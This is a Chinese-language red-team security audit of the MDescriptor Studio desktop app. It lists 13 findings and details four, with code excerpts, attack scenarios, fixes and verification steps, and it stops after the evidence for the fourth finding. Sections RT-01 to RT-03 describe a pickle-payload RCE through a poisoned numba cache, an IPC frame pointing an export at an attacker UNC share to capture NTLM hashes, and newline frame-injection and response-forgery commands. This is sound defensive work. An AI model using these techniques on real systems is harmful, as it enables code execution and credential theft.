# MDescriptor Studio — 红队代码审计报告

- **审计日期**：2026-08-31
- **审计范围**：`backend/**`（含 `backend.spec`）、`src-tauri/**`、`frontend/src/**`、`scripts/**`、`tests/**`
- **排除**：`frontend/node_modules`、`src-tauri/target`、`**/__pycache__`、`.venv`（仅在第 RT-01 条为确认第三方库行为做了定向只读核查）、`tests/data`
- **模式**：只读静态审计，未启动应用、未 spawn 后端、未安装任何包
- **威胁模型**：(a) 恶意/被污染数据集文件；(b) 被攻陷的 npm/PyPI/crates 依赖或镜像源；(c) 本机低权限恶意软件或同机其他用户；(d) 前端被注入的脚本

---

## 1. 执行摘要

最高危的三条构成一个完整的本地攻击链：

1. **RT-01（High）Numba JIT 缓存投毒 → pickle RCE**：`analysis/engine.py:604-635` 主动把 numba 的 JIT 磁盘缓存重定向到 `MDS_DATA_DIR/numba-cache` 或 `%TEMP%/numba-cache` 这类可写、可预测的路径，而 numba 0.67.0 在 `caching.py:588` 处先 `pickle.load()` 索引文件、之后才做任何时间戳/版本校验。同机攻击者投放一个恶意 `.nbi` 文件，受害者下次跑 UMAP 即在后端进程内获得代码执行。
2. **RT-02（High）`analysis.export` 的 `output_path` 完全没有校验**：`analysis_service.py:669-672` 直接把 webview 传来的字符串 `expanduser()` 后用作写入目标，`_write_export`（1336-1357 行）会 `mkdir(parents=True)` 并覆盖写入任意路径（含 UNC → NTLM 凭据外泄）。
3. **RT-03（High）IPC 通道是全权限代理**：`main.rs:22-35` 的 `backend_send` 把 webview 的任意字符串原样写进后端 stdin，无方法白名单、无参数模式校验、不拒绝内嵌换行（可帧注入）；响应事件广播给所有监听器且请求 id 从 1 单调递增可预测（可响应伪造）。它把威胁 (b)/(d)（一个被投毒的 npm 依赖）直接放大成本地任意文件写 + RCE。

此外 7 条 Medium 覆盖：sidecar 可执行文件无完整性校验（RT-04）、pip 自更新信任 PyPI 版本号且未固定索引/哈希（RT-05）、`dataset.register` 任意路径解析（RT-06）、数据集指纹只哈希 size+mtime 可被绕过（RT-07）、extxyz `natoms` 无上限导致 OOM（RT-08）、RPC 任务队列无界（RT-09）、`result.remove`/`analysis.delete` 对 DB 中的 `result_path` 无条件 `shutil.rmtree` 可致任意目录删除（RT-10）。

---

## 2. 信任边界与攻击面地图

| # | 信任边界 | 跨越边界的数据 | 边界上现有校验 | 评价 |
|---|---|---|---|---|
| B1 | **WebView JS ⇄ Rust 命令层**（`invoke`） | `backend_send(line)`、`backend_restart()`、`backend_ready_line()` 的参数 | 无。Tauri capability（`src-tauri/capabilities/default.json:6-15`）只列了 `core:default`/`core:event:default`/几个 window 权限/`dialog:default`，**没有任何针对 `backend_send` 的权限声明**；Rust 侧也不校验 `line` 的内容、长度或是否含换行 | **缺失**（RT-03） |
| B2 | **Rust ⇄ Python 后端 stdio**（NDJSON） | 逐行文本 | `frames.py:18` 8 MB 行长度限制；`frames.py:26-31` `protocol_version` 校验（不匹配则 `server.py:59` `os._exit(2)`）；`frames.py:34-38` `method` 为非空字符串、`params` 为 dict | 长度与版本校验有效；**无方法白名单、无参数 schema、无换行过滤**（RT-03） |
| B3 | **后端 stdio ⇄ 后端方法表** | `method` + `params` | 仅 `server.py:61` 的方法名查表；每个 handler 各自做（程度不一的）校验 | 逐方法审计，见 RT-02/RT-06/RT-08 |
| B4 | **后端 ⇄ 文件系统（用户命名路径）** | `dataset.register.path`、`analysis.export.output_path`、`descriptor.parameters.model` | `dataset_service.py:133` 仅 `path.exists()`；`analysis_service.py:670` 仅 `if not target: raise` | **缺失**（RT-02、RT-06） |
| B5 | **后端 ⇄ 数据集文件内容** | extxyz 文本、DeepMD npy/npz | `extxyz.py:39-47` 只做 `int()` 解析；`deepmd.py` 直接交给 dpdata 全量载入内存 | 无尺寸/原子数/形状上限（RT-08） |
| B6 | **后端 ⇄ PyPI 网络** | `info.version` 字符串 | 无版本号格式校验（`update_service.py:80` 仅 `str().strip()`） | **缺失**（RT-05） |
| B7 | **后端 ⇄ 本机磁盘上的 numba 缓存** | `.nbi`/`.nbc` 文件 | 无。应用还主动把缓存移出受保护位置 | **缺失且被应用放大**（RT-01） |
| B8 | **Rust ⇄ 同目录 sidecar 可执行文件** | `backend-<triple>.exe` | 仅 `sidecar.exists()`（`main.rs:115`）。无签名、无哈希、无 Authenticode 校验 | **缺失**（RT-04） |
| B9 | **进程环境 ⇄ 后端数据目录** | `MDS_DATA_DIR` | 仅 `if override:` 与 `if !data_dir.is_empty()`（`main.rs:118`、`config.py:14`） | **缺失**（RT-11） |
| B10 | **构建期依赖 ⇄ 运行时产物** | npm 包（全部 `^` 范围）、PyPI 包（`==` 但无 hash）、165 MB 预构建 sidecar | `package-lock.json` 存在但依赖声明用 `^`；`requirements.txt` 无 `--hash`；sidecar 二进制入 Git 但无校验和 | 不完整（RT-12） |
| B11 | **SQLite 内容 ⇄ 文件系统操作** | `result_path` 列 | 无。`result_service.py:113`、`analysis_service.py:1575` 直接 `shutil.rmtree` | **缺失**（RT-10） |

---

## 3. 发现清单汇总表

| ID | 标题 | 严重度 | CWE | 类别 | 位置（文件:行） | 可达性 |
|---|---|---|---|---|---|---|
| RT-01 | Numba JIT 缓存被重定向到可写路径，反序列化未校验 → pickle RCE | **High** | CWE-502 / CWE-427 | 反序列化 / 本地提权·RCE | `backend/.../analysis/engine.py:604-635`；触发点 `umap/layouts.py:34`；利用原语 `.venv/.../numba/core/caching.py:588` | 需同机写 `%TEMP%` 或 `MDS_DATA_DIR`；用户跑一次 UMAP 即触发 |
| RT-02 | `analysis.export` 的 `output_path` 无校验 → 任意路径写覆盖 / 建目录 / UNC 凭据外泄 | **High** | CWE-22 / CWE-73 / CWE-497 | 路径遍历 / 任意文件写 | `backend/.../services/analysis_service.py:669-672, 1335-1357` | 需 webview 内代码执行（被污染依赖/XSS）或直接构造 IPC 帧 |
| RT-03 | `backend_send` 是全权限 IPC 代理：无方法白名单、可注入换行、响应可被伪造 | **High** | CWE-345 / CWE-93 / CWE-807 | 跨信任边界伪造 / 输入校验 | `src-tauri/src/main.rs:22-35, 86-96`；`protocol/server.py:41-47`；`frontend/src/ipc/client.ts:26,58-63,70` | webview 内任意脚本；是所有 (b)/(d) 类威胁的放大器 |
| RT-04 | Release 下从 exe 同目录加载 sidecar，无签名/完整性校验 → 可执行文件与 DLL 侧载 | Medium | CWE-427 / CWE-426 | 不安全的可执行文件加载 | `src-tauri/src/main.rs:106-126`；`backend/backend.spec:55-68` | 需对安装目录有写权限（非默认安装路径/便携部署/ACL 配置错误）；perMachine 安装是部分缓解 |
| RT-05 | pip 自更新信任 PyPI 返回的版本号，未固定索引、未校验哈希 | Medium | CWE-494 / CWE-829 | 命令注入 / 供应链 | `backend/.../services/update_service.py:19,73-92,101-116`；`main.py:60-66` | Dev / 非 frozen 构建；release 被 `_frozen()` 阻断（缓解），但镜像源劫持时仍影响 dev |
| RT-06 | `dataset.register` 任意路径解析（`format` 可绕过扩展名检查）+ 错误信息泄露 | Medium | CWE-22 / CWE-209 / CWE-73 | 路径遍历 / 信息泄露 | `services/dataset_service.py:128-140`；`datasets/base.py:69-84`；`datasets/extxyz.py:32-52,99-122` | 需 webview 内代码执行 |
| RT-07 | 数据集指纹只哈希 size+mtime，不含内容 → 完整性/STALE 保护可绕过 | Medium | CWE-354 / CWE-345 | 数据完整性 | `datasets/fingerprint.py:9-22`；消费点 `dataset_service.py:270-283`、`analysis_service.py:944-955`、`descriptor_service.py:179-193` | 需对数据集文件有写权限（威胁 a/c）；改内容后恢复 size+mtime 即可 |
| RT-08 | extxyz `natoms` 无上限 + 全量帧载入内存 → 恶意数据集 OOM DoS | Medium | CWE-789 / CWE-400 | 资源耗尽 | `datasets/extxyz.py:38-47,99-100`；`services/descriptor_service.py:336-338`；`datasets/deepmd.py:8-9,49` | 用户导入一个恶意 `.xyz`/DeepMD 目录即触发 |
| RT-09 | RPC 线程池任务队列无界 → 内存放大 DoS | Medium | CWE-770 / CWE-400 | 资源耗尽 | `protocol/server.py:25,41-47`；`frames.py:10,18` | 需能写后端 stdin（webview 代码执行） |
| RT-10 | `result.remove`/`analysis.delete` 对 DB 中的 `result_path` 无条件 `rmtree` → 任意目录删除 | Medium | CWE-22 / CWE-59 | 任意文件删除 | `services/result_service.py:105-113`；`services/analysis_service.py:378-381,1570-1575` | 需能写 `database.sqlite`（`MDS_DATA_DIR` 指向共享位置，或同用户恶意软件） |
| RT-11 | `MDS_DATA_DIR` 完全受控且无校验 → 数据目录重定向 | Low | CWE-15 / CWE-426 | 外部控制的配置 | `config.py:12-21`；`src-tauri/src/main.rs:117-121`；`engine.py:613`；`storage/database.py:108` | 需能设置进程环境变量（同机用户/恶意软件/快捷方式） |
| RT-12 | 供应链：依赖无哈希锁定、npm 全 `^` 范围、165 MB 预构建二进制入库无校验和 | Low | CWE-494 / CWE-1357 | 供应链 | `backend/requirements.txt:1-10`；`frontend/package.json:13-27`；`src-tauri/binaries/`；`scripts/package.ps1:11-14` | 构建期；需镜像源/仓库被劫持 |
| RT-13 | CSP 缺少 `script-src`/`object-src`/`base-uri`/`frame-ancestors`，保留 `style-src 'unsafe-inline'` | Low | CWE-1021 / CWE-693 | Tauri 配置硬化 | `src-tauri/tauri.conf.json:25` | 当前前端未发现 XSS sink，属纵深防御缺口 |

**分布**：High 3 / Medium 7 / Low 3，共 13 条；另有 8 条附加发现（A1–A8）。

---

## 4. 逐条详情

### RT-01 — Numba JIT 缓存被重定向到可写路径，反序列化未校验 → pickle RCE

- **严重度**：High（若 `MDS_DATA_DIR` 指向共享/网络目录则升为 Critical）
- **CWE**：CWE-502（不可信数据反序列化）、CWE-427（不受控的搜索路径）
- **类别**：反序列化 / 本地代码执行
- **置信度**：高（`pickle.load` 调用点已在安装的 numba 0.67.0 源码中定位确认）

**证据**

```python
# backend/mdescriptor_studio_backend/analysis/engine.py:604-635
class _FrozenCacheLocator(caching.UserWideCacheLocator):
    def __init__(self, py_func, py_file):
        ...
        root = os.environ.get("MDS_DATA_DIR") or tempfile.gettempdir()   # <-- 613
        subpath = self.get_suitable_cache_subpath(py_file)
        self._cache_path = os.path.join(root, "numba-cache", subpath)    # <-- 615
...
numba.config.CACHE_LOCATOR_CLASSES = ""                                  # <-- 633
caching.CacheImpl._locator_classes = [_FrozenCacheLocator]               # <-- 634
caching.CompileResultCacheImpl._locator_classes = [_FrozenCacheLocator]  # <-- 635
```

该 monkeypatch 只在 `sys.frozen` 为真时执行（`engine.py:592`），即 **release/PyInstaller 构建才是受影响路径**，并通过 `main.py:164` 的 `AnalysisEngine.warmup()` 在启动时生效。

numba 侧（`.venv/Lib/site-packages/numba/core/caching.py`，版本 0.67.0）：

```python
# caching.py:581-604
def _load_index(self):
    try:
        with open(self._index_path, "rb") as f:
            version = pickle.load(f)      # <-- 588：在任何校验之前反序列化
            data = f.read()
    except FileNotFoundError:
        return {}
    if version != self._version:          # <-- 593：版本检查在此之后
        return {}
    stamp, overloads = pickle.loads(data) # <-- 597
    if stamp != self._source_stamp:       # <-- 599：源时间戳检查在此之后
        return {}
    return overloads
```

调用链：`umap/layouts.py:34` 的 `@numba.njit(..., cache=True)` 函数被调用 → `numba` `FunctionCache.load()` → `IndexDataCacheFile.load(key)` → `_load_index()` → `pickle.load()`。
`cache=True` 已被实际使用：仓库中已存在产物 `umap/__pycache__/layouts.rdist-31.py312.1.nbc`。
`caching.py:618` 的 `_load_data()` 同样使用 `pickle.loads(data)` 读 `.nbc`。

**攻击场景**（威胁 c：同机低权限恶意软件 / 同机其他用户）

前置条件：攻击者对受害者的 `%TEMP%`（未设 `MDS_DATA_DIR` 时的默认根）或 `MDS_DATA_DIR` 指向的目录**具有写权限**。这在以下情况成立：`MDS_DATA_DIR` 被配置到共享盘/共享目录（大容量数据集场景常见）、`%TEMP%` 被重定向到共享位置、或攻击者与受害者同属一个宽松 ACL 的目录。

1. 攻击者在受害者机器上先正常运行一次 UMAP 分析（或预测路径），得到缓存子路径 `<root>/numba-cache/<subpath>/<base>.nbi`。子路径由 `get_suitable_cache_subpath()` 从模块路径推导，对固定构建是**确定值**，只需观察一次。
2. 攻击者用带 `__reduce__` 的 pickle 载荷覆盖该 `.nbi` 文件。注意：`pickle.load` 在第 588 行即执行，载荷可以在"返回版本号整数"的同时执行任意代码，因此**不需要绕过版本检查或时间戳检查**。
3. 受害者正常使用 MDescriptor Studio 并运行任意 UMAP 分析（Analysis 页 → UMAP）。
4. `umap` 调用被缓存的 njit 函数 → numba 读索引 → `pickle.load` → 载荷在**后端 sidecar 进程**内以受害者权限执行。

**影响**：受害者上下文内的任意代码执行（读写其全部数据、安装持久化、横向移动）。若受害者曾以管理员身份运行该应用（perMachine 安装后用户常"以管理员身份运行"），则构成提权。同时这是一个**驻留/持久化点**：缓存文件留在磁盘上，每次 UMAP 都会触发。

**已有缓解**：无。相反，`engine.py:592-635` 的注释说明这是**刻意**绕开 numba 默认缓存位置（`__pycache__`，位于受 ACL 保护的安装目录内）而引入的——也就是说应用自身把暴露面从"受保护位置"搬到了"可写位置"。`main.rs` 只在自己进程环境里存在 `MDS_DATA_DIR` 时才透传（117-121 行），所以 release 下默认落到 `%TEMP%`。

**修复建议**（落到代码层）

1. `analysis/engine.py:613` 处停止使用 `%TEMP%` 兜底，改为应用私有目录并显式收紧 ACL：

```python
# engine.py:613 附近
import os, tempfile
from ..config import data_dir  # 或显式构造
root = os.environ.get("MDS_DATA_DIR")
if root:
    # 拒绝 UNC / 网络路径 / 相对路径
    if root.startswith("\\\\") or not os.path.isabs(root):
        root = None
if not root:
    root = os.path.join(os.environ.get("LOCALAPPDATA") or tempfile.gettempdir(), "MDescriptorStudio")
cache_root = os.path.join(root, "numba-cache")
```

2. 启动时把 `cache_root` 建为**仅当前用户可写**并清空历史缓存（`engine.py:633` 之前）：
   - Windows：`os.makedirs(cache_root, exist_ok=True)`，然后用 `icacls` 重置继承并只授予当前 SID（`subprocess` 调用或 `pywin32` SetNamedSecurityInfo）；
   - 每次启动删除 `cache_root` 下超过 N 天或不属于本次安装的条目（简单做法：启动时 `shutil.rmtree(cache_root, ignore_errors=True)`，代价是 UMAP 首次编译变慢，可加一个"仅当应用版本变化或缓存目录 ACL 不合规时清空"的开关）。
3. 更彻底的做法：**禁用 numba 磁盘缓存**。在 `engine.py` 导入 numba 之前设置 `os.environ["NUMBA_DISABLE_JIT_CACHE"] = "1"`（或在 `warmup()` 里 `numba.config.DISABLE_JIT_CACHE = 1`）。代价是 UMAP 首次运行多几秒编译时间，与安全收益相比可接受，是本条最推荐的方案。
4. 无论采用哪种，都应在 `engine.py:604` 附近加注释说明为何不能把缓存放到可预测的可写路径。

**验证方式**（不要在生产机上做完整利用）

- 静态确认：`grep -n "cache=True" .venv/Lib/site-packages/umap/layouts.py` 与 `grep -n "pickle.load" .venv/Lib/site-packages/numba/core/caching.py`。
- 行为确认（在隔离 VM、临时 `MDS_DATA_DIR` 下）：
  1. 设 `MDS_DATA_DIR=<临时目录>`，跑一次 UMAP，然后 `dir /s <临时目录>\numba-cache` 确认 `.nbi` 文件确实生成在该处（证明路径可预测且落在受控目录）。
  2. 用一个**无害**的 pickle 载荷（例如 `__reduce__` 返回一个在 `<临时目录>\proof.txt` 里写字符串的纯函数，不要用真实 shell 命令）覆盖 `.nbi`，清空进程后再次运行 UMAP，检查 `proof.txt` 是否被创建。若被创建，即证明 `pickle.load` 在校验之前执行，RCE 成立。
  - 注意：载荷必须能被 `pickle.load` 还原为版本号整数以外的对象也不影响——第 588 行只要能反序列化就会执行副作用。

---

### RT-02 — `analysis.export` 的 `output_path` 无校验 → 任意路径写覆盖 / 建目录 / UNC 凭据外泄

- **严重度**：High
- **CWE**：CWE-22、CWE-73（外部控制文件名/路径）、CWE-497
- **类别**：路径遍历 / 任意文件写
- **置信度**：高

**证据**

```python
# backend/mdescriptor_studio_backend/services/analysis_service.py:664-673
selected = params.get("indices")
...
target = str(params.get("output_path") or "")
if not target:
    raise AppError(ANALYSIS_INPUT_INVALID, "output_path is required for export")
target = str(Path(target).expanduser())          # <-- 672：唯一的"处理"是 expanduser
canonical = self._analysis_cache_key(...)        # <-- 673：直接进缓存键，无任何校验
```

```python
# analysis_service.py:1318-1357（_write_export）
target = target.expanduser()                     # <-- 1335
if export_format == "json":
    target.parent.mkdir(parents=True, exist_ok=True)   # <-- 1337：任意目录创建
    ...
    target.write_text(...)                              # <-- 1339：任意文件覆盖
if export_format == "csv":
    target.parent.mkdir(parents=True, exist_ok=True)    # <-- 1342
    with target.open("w", newline="", encoding="utf-8") as fh:   # <-- 1343
...
target.mkdir(parents=True, exist_ok=True)              # <-- 1355（deepmd）
```

前端侧 `output_path` 是一个**自由文本输入框**，没有强制走保存对话框：

```tsx
// frontend/src/pages/Analysis.tsx:216
const [exportPath, setExportPath] = useState("");
// frontend/src/pages/Analysis.tsx:770
const response = await ipc.request<AnalysisJobResponse>("analysis.export",
  { run_id: selectedRun, indices, mode, format: exportFormat, output_path: exportPath.trim() });
```

**攻击场景**（威胁 b/d：webview 内代码执行）

前置条件：能够在 webview 上下文中执行 JS——即一个被投毒的 npm 依赖（`frontend/package.json` 全部为 `^` 范围，见 RT-12），或未来出现的 XSS（见 RT-13）。由于 `backend_send` 无方法白名单（RT-03），攻击者可直接构造 IPC 帧，无需经过 UI。

1. 攻击者脚本调用 `backend_send`，发送 `{"protocol_version":1,"id":1,"method":"analysis.export","params":{"run_id":"<任一 COMPLETED run>","format":"csv","mode":"structure","indices":[],"output_path":"C:\\Users\\victim\\Documents\\重要报告.xlsx"}}`。
2. 后端 job 线程执行 `_write_export`，`mkdir(parents=True)` 后 `open("w")` **截断并覆盖**目标文件。
3. 变体：
   - `output_path = "C:\\Windows\\..."`：写入失败（非提权），但可用于探测。
   - `output_path = "\\\\attacker.tld\\share\\out.csv"`：后端向攻击者 SMB 服务器发起认证 → **NTLMv2 哈希外泄 / 中继**（Windows 上访问 UNC 即自动 NTLM 认证，无需用户交互）。这不需要后端真的写成功。
   - `format="deepmd"` + `output_path` 为任意目录 → 在任意位置递归建目录并写入 `type.raw`、`type_map.raw`、`set.000/*.npy`。
   - 覆盖 DLL/EXE/配置文件 → 使应用或系统上其他程序失效（破坏性 DoS）。

**影响**：受害者可写范围内的**任意文件破坏性覆盖**；任意位置目录创建；**UNC 触发的 NTLM 凭据外泄/中继**（这是本条最容易被忽略、也最容易跨域的一点）。
写入**内容**受控程度低（JSON/CSV 记录、extxyz 坐标、deepmd 数组，均由数值与元素符号构成），因此本条**不是**直接的代码执行原语——但结合 RT-01（写恶意 `.nbi`）或覆盖某个随后被加载的配置文件，可以升级。

**已有缓解**：无。`indices` 有类型校验（667 行）、`format` 有枚举校验（659 行）、`mode` 有枚举校验（662 行），唯独 `output_path` 只有非空检查。

**修复建议**（落在 `analysis_service.py:669` 之后、`submit_export` 返回之前）

在 `target = str(params.get("output_path") or "")` 之后插入一个强制校验函数，至少覆盖以下边界条件：

```python
_FORBIDDEN_SUFFIXES = {".exe", ".dll", ".bat", ".cmd", ".ps1", ".lnk", ".scr", ".sys", ".vbs", ".js", ".pif"}

def _safe_output_path(raw: str, data_dir: Path) -> Path:
    # 1) 拒绝 UNC 与设备路径（防 NTLM 外泄与设备访问）
    if raw.startswith("\\\\") or raw.startswith("//") or raw.startswith("\\\\?\\") or raw.startswith("\\\\.\\"):
        raise AppError(EXPORT_FAILED, "output_path must be a local path (UNC is not allowed)")
    # 2) 拒绝 NTFS 备用数据流与冒号（除盘符外）
    if ":" in raw[2:] or "::$" in raw.upper():
        raise AppError(EXPORT_FAILED, "output_path must not contain alternate data streams")
    p = Path(os.path.expanduser(raw))
    # 3) 必须是绝对路径；拒绝相对路径（避免随进程 CWD 漂移）
    if not p.is_absolute():
        raise AppError(EXPORT_FAILED, "output_path must be absolute")
    # 4) 规范化后仍不得包含 '..'，且必须落在允许的基目录内
    resolved = p.resolve(strict=False)
    allowed = (data_dir / "exports").resolve()
    if ".." in resolved.parts:
        raise AppError(EXPORT_FAILED, "output_path must not contain '..'")
    if not str(resolved).lower().startswith(str(allowed).lower() + os.sep):
        raise AppError(EXPORT_FAILED, f"output_path must be under {allowed}")
    # 5) 拒绝 Windows 保留设备名（CON/NUL/AUX/COM1-9/LPT1-9，含带扩展名形式）
    stem = resolved.name.split(".")[0].upper()
    if stem in {"CON","PRN","AUX","NUL"} or re.fullmatch(r"COM[1-9]|LPT[1-9]", stem):
        raise AppError(EXPORT_FAILED, "output_path uses a reserved Windows device name")
    # 6) 拒绝危险扩展名
    if resolved.suffix.lower() in _FORBIDDEN_SUFFIXES:
        raise AppError(EXPORT_FAILED, "output_path has a disallowed extension")
    # 7) 已存在时，拒绝跟随符号链接（防写到链接目标）
    if resolved.exists() and resolved.is_symlink():
        raise AppError(EXPORT_FAILED, "output_path must not be a symlink")
    return resolved
```

配套：
- 前端 `frontend/src/pages/Analysis.tsx:216/770` 应改为只能由 `@tauri-apps/plugin-dialog` 的 `save()` 填充路径（该插件已在 capability 中被授权），禁止手输。
- 若产品确实需要"导出到用户指定位置"，则在 Rust 侧提供专门的 `export_save` 命令，由 Rust 做路径校验后再落盘，不要把任意路径从 webview 透传到 Python。
- 写入时用 `os.open(..., os.O_CREAT | os.O_WRONLY | os.O_TRUNC | os.O_NOFOLLOW, 0o600)` 替代 `Path.open("w")`，避免最后的符号链接 TOCTOU。
- `mkdir` 改为 `os.makedirs(..., exist_ok=True)` 并逐段校验仍在允许基目录内。

**验证方式**

- 单元级（不动真实文件）：在临时目录构造一个 COMPLETED run（参考 `tests/test_analysis_flow.py` 的夹具），调用 `AnalysisService.submit_export({"run_id":..., "format":"csv", "output_path":"C:\\Windows\\System32\\drivers\\etc\\hosts"})`，推进 job，断言写操作发生（或在没有权限时断言错误信息）；再用 `output_path="<tmp>\\..\\..\\outside.csv"` 断言文件被写到允许目录之外。
- UNC 场景：在隔离网络里起一个 SMB 监听（`smbserver.py -smb2support` 或 Responder），发送 `output_path="\\\\<监听IP>\\share\\a.csv"`，观察是否收到 NTLM 认证握手。**只在隔离实验网内做**。

---

### RT-03 — `backend_send` 是全权限 IPC 代理：无方法白名单、可注入换行、响应可被伪造

- **严重度**：High
- **CWE**：CWE-345（数据真实性不足）、CWE-93（CRLF 注入）、CWE-807（依赖不可信输入做安全决策）
- **类别**：跨信任边界伪造 / 输入校验
- **置信度**：高

**证据**

```rust
// src-tauri/src/main.rs:21-35
#[tauri::command]
fn backend_send(state: tauri::State<BackendState>, line: String) -> Result<(), String> {
    let mut guard = state.child.lock().map_err(|e| e.to_string())?;
    match guard.as_mut() {
        Some(child) => {
            let stdin = child.stdin.as_mut().ok_or("backend stdin closed")?;
            stdin
                .write_all(line.as_bytes())     // <-- 28：line 原样写入，未过滤 '\n' / '\r'
                .and_then(|_| stdin.write_all(b"\n"))
                .and_then(|_| stdin.flush())
                ...
```

```python
# backend/mdescriptor_studio_backend/protocol/server.py:39-47
def serve_forever(self) -> None:
    for raw in sys.stdin:        # <-- 41：按行切分，注入的 '\n' 会被切成多个请求
        line = raw.strip()
        if not line:
            continue
        if self._closed.is_set():
            break
        self._pool.submit(self._handle, line)   # <-- 47：无界提交
```

```python
# backend/.../protocol/server.py:61-69
handler = self.methods.get(method)   # <-- 61：方法表查表即执行，无白名单/无授权分级
```

```rust
// src-tauri/src/main.rs:86-96
for line in reader.lines() {
    ...
    if handle.emit("backend-message", l).is_err() {   // <-- 94：向所有监听器广播，无过滤
```

```ts
// frontend/src/ipc/client.ts:26, 70
private nextId = 1;                                   // <-- 26：从 1 开始单调递增
const id = this.nextId++;                             // <-- 70：完全可预测
// frontend/src/ipc/client.ts:58-63
if (typeof frame.id === "number" && this.pending.has(frame.id)) {
    const p = this.pending.get(frame.id)!;
    this.pending.delete(frame.id);
    if (frame.error) p.reject(frame.error);
    else p.resolve(frame.result);                     // <-- 62：不校验来源
}
```

```json
// src-tauri/capabilities/default.json:6-15
"permissions": [
  "core:default", "core:event:default",
  "core:window:allow-close", ... ,
  "dialog:default"
]
// 没有任何针对 backend_send / backend_restart / backend_ready_line 的权限声明
```

**攻击场景**（威胁 b/d）

前置条件：webview 内可执行任意 JS（被投毒的 npm 依赖、构建期供应链污染、或未来 XSS）。当前第一方代码里**没有** XSS sink（见 RT-13），所以本条的主要现实入口是 (b)。

1. **方法滥用**：注入脚本直接 `invoke("backend_send", {line: JSON.stringify({protocol_version:1,id:1,method:"analysis.export",params:{...}}))}`，绕过全部 UI 约束，触达后端 40+ 个方法中的任意一个（RT-02 的任意写、RT-01 的缓存路径、`dataset.register` 的任意路径解析、`settings.set`、`engine.update` 等）。
2. **帧注入/请求伪造**：`line` 中嵌入 `\n`，例如
   `{"protocol_version":1,"id":1,"method":"settings.get","params":{"key":"ui.language"}}\n{"protocol_version":1,"id":2,"method":"analysis.export","params":{...}}`
   Rust 原样写出，后端 `for raw in sys.stdin` 把它当成**两个独立请求**，第二个请求从未经过前端的 `ipc.request()`，因此不会出现在 `pending` 表里，其响应只能被攻击者的监听器收到——可用于"隐身调用"。反向也可用来**破坏**前端：注入一个非法行，使后端 `os._exit(2)`（`server.py:59`，协议版本不匹配分支）从而搞挂整个后端。
3. **响应伪造**：请求 id 从 1 单调递增且完全可预测；`backend-message` 通过 `app.emit` 广播给所有监听器，`onLine` 不校验消息来源（无窗口/无序列号/无 HMAC）。注入脚本 `emit("backend-message", JSON.stringify({protocol_version:1,id:<下一个 id>,result:{...}}))` 即可让前端把攻击者编造的数据当作后端结果：伪造 `job.finished`（让 UI 显示"分析成功"）、伪造 `engine.update.state`、伪造 `backend.ready`（`ipc/client.ts:54` 分支）、伪造 `analysis.preview` 的散点数据。

**影响**：本条本身不直接产生漏洞，但它是**所有 (b)/(d) 类威胁的放大器**：一个被投毒的前端依赖即等价于拿到后端全部能力（任意文件写、路径探测、pip 更新触发、numba 缓存路径控制）。响应伪造还可造成**数据完整性破坏**——用户在 UI 上看到的分析结论可被静默篡改，这在科研工具里是实质危害。

**已有缓解**：`frames.py:18` 的 8 MB 长度限制与 `frames.py:26-31` 的 `protocol_version` 校验对**协议健壮性**有效，但都不是授权机制。前端 `JSON.stringify`（`client.ts:77`）会转义换行，所以**第一方客户端是安全的**——缺口在 Rust 侧不校验。

**修复建议**

1. **在 Rust 侧拒绝含控制字符的 `line`**（`main.rs:26` 之前）：

```rust
if line.bytes().any(|b| b == b'\n' || b == b'\r' || b == 0) {
    return Err("backend_send: control characters are not allowed".into());
}
if line.len() > 8 * 1024 * 1024 {
    return Err("backend_send: frame too large".into());
}
```

2. **让 Rust 自己构造帧，而不是透传字符串**。把命令签名改为 `backend_request(method: String, params: serde_json::Value)`，由 Rust 生成 `id`（用 `rand` 的 CSPRNG，或维护一个 Rust 侧计数器）并用 `serde_json::to_string` 序列化，从根上消除帧注入与 id 可预测。前端 `frontend/src/ipc/client.ts:66-82` 相应改为 `invoke("backend_request", { method, params })`，返回 Rust 分配的 id。
   - 过渡期若必须保留 `backend_send`，至少在 Rust 侧校验 `line` 是一个合法 JSON 对象且 `method` 属于一份硬编码白名单。
3. **方法白名单/分级**：在 `main.rs` 或 `protocol/server.py:61` 前维护一张"可从 webview 调用"的方法表；把 `engine.update`、`analysis.export`、`dataset.register` 这类高风险方法标记为需要额外确认（例如由 Rust 触发原生确认对话框），或只暴露给特定窗口。
4. **事件来源绑定**：`main.rs:94` 用 `handle.emit_to(webview_label, ...)` 而非 `app.emit`，把帧只发给发起它的 webview；`client.ts:46` 增加"只接受与已发出请求 id 匹配、且未被消费过一次"的严格匹配（目前 `pending.delete` 已做一次消费，但 id 可预测，需配合随机 id）。
5. `src-tauri/capabilities/default.json` 显式声明这三个命令的权限（若 Tauri 版本支持为应用自定义命令生成权限），避免依赖默认策略。

**验证方式**

- 静态：`grep -n "backend_send" src-tauri/src/main.rs` 确认无控制字符过滤；`grep -rn "dangerouslySetInnerHTML\|new Function" frontend/src` 确认当前无 XSS sink（这决定可达性依赖 (b)）。
- 动态（在 dev 构建 + 浏览器 DevTools 控制台，非生产）：
  - 帧注入：`await window.__TAURI_INTERNALS__.invoke("backend_send", { line: '{"protocol_version":1,"id":1,"method":"system.info","params":{}}\n{"protocol_version":1,"id":1,"method":"system.info","params":{}}' })`，观察后端是否返回两个响应帧。
  - 响应伪造：先发一个正常请求，随后 `await window.__TAURI_INTERNALS__.invoke("plugin:event|emit", ...)` 或 `@tauri-apps/api` 的 `emit("backend-message", '{"protocol_version":1,"id":<id>,"result":{"backend_version":"FORGED"}}')`，观察前端是否接受。
  - 只做只读方法（`system.info`），不要调用 `analysis.export`/`engine.update`。

---

### RT-04 — Release 下从 exe 同目录加载 sidecar，无签名/完整性校验

- **严重度**：Medium（若应用被安装到用户可写目录，或应用被以管理员身份运行，则升为 High）
- **CWE**：CWE-427、CWE-426（不可信搜索路径）
- **类别**：不安全的可执行文件加载 / 持久化
- **置信度**：中（取决于实际部署位置与安装目录 ACL）

**证据**

```rust
// src-tauri/src/main.rs:106-126
fn backend_command() -> (Command, &'static str) {
    if !cfg!(debug_assertions) {
        if let Ok(exe) = std::env::current_exe() {
            let dir = exe.parent().unwrap().to_path_buf();
            for name in [format!("backend-{TRIPLE}.exe"), "backend.exe".to_string()] {
                let sidecar = dir.join(&name);
                if sidecar.exists() {                 // <-- 115：唯一的检查是"存在"
                    let mut c = Command::new(sidecar); // <-- 116：直接执行
                    ...
                    return (c, "sidecar");
```

```json
// src-tauri/tauri.conf.json:28-39
"bundle": { "externalBin": ["binaries/backend"],
            "windows": { "nsis": { "installMode": "perMachine" } } }
```

```python
# backend/backend.spec:55-68
exe = EXE(pyz, a.scripts, a.binaries, a.datas, [],
          name="backend", console=True, upx=False, strip=False, ...)   # onefile + 控制台窗口
```

